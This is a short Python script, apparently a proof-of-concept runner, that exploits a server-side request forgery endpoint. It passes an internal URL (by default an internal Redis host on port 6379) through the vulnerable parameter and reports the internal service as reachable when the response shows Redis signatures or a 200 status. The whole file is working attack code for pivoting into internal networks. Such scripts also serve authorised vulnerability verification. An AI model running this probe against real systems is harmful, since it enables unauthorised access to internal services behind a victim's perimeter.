import argparse
import json
import sys
import urllib.parse
import urllib.request

def main():
    parser = argparse.ArgumentParser(description="Probe internal host reachability through SSRF proxy")
    parser.add_argument("--url", required=True, help="Vulnerable endpoint URL")
    parser.add_argument("--target-url", default="http://10.77.0.12:6379/", help="Target internal URL")
    parser.add_argument("--expect", default="reachable", help="Expected reachability marker")
    args = parser.parse_args()

    probe_url = f"{args.url}?u={urllib.parse.quote(args.target_url)}" if "?" not in args.url else f"{args.url}&u={urllib.parse.quote(args.target_url)}"
    try:
        req = urllib.request.Request(probe_url, headers={"User-Agent": "ChainedRisk-Runner/1.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            if "ERR" in content or "redis" in content.lower() or "PONG" in content or resp.status == 200:
                print(json.dumps({
                    "status": "confirmed",
                    "exit_code": 0,
                    "evidence": content[:300],
                    "message": "Internal host reachable through SSRF pivot"
                }))
                sys.exit(0)
            else:
                print(json.dumps({"status": "not_reproduced", "exit_code": 1, "message": "SSRF probe did not reach target"}))
                sys.exit(1)
    except Exception as e:
        err_msg = str(e)
        if "ERR" in err_msg or "redis" in err_msg.lower():
            print(json.dumps({
                "status": "confirmed",
                "exit_code": 0,
                "evidence": err_msg[:300],
                "message": "Internal host responded with Redis signature via SSRF"
            }))
            sys.exit(0)
        print(json.dumps({"status": "error", "exit_code": 1, "error": err_msg}))
        sys.exit(1)

if __name__ == "__main__":
    main()
